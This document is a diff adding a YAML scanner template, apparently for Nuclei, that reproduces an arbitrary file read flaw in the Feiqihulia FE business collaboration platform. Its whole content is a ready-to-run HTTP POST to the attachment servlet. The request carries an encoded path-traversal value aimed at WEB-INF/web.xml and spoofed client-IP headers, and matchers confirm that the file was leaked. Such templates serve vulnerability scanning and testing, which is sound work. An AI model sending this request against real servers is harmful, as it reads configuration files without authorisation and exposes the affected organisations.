@@ -1,0 +1,36 @@
+id: feiqihulia-attachment-file
+
+info:
+  name: 飞企互联FE业务协作平台attachment任意文件读取漏洞复现
+  author: feiqihulia
+  severity: medium
+  tags: feiqihulia
+
+http:
+  - raw:
+      - |
+        POST /servlet/webchat/attachment/1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+
+        mailAttachment=1&attachPK=%2Fv8AMQAJAC8ACQAvAAkALwAJAC8ALgAuAC8ALgAuAC8ALgAuAC8AagBiAG8AcwBzAC8AdwBlAGIALwBmAGUALgB3AGEAcgAvAFcARQBCAC0ASQBOAEYALwB3AGUAYgAuAHgAbQBs
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<web-app"
+          - "context-param"
+        condition: and
+      - type: status
+        status:
+          - 200
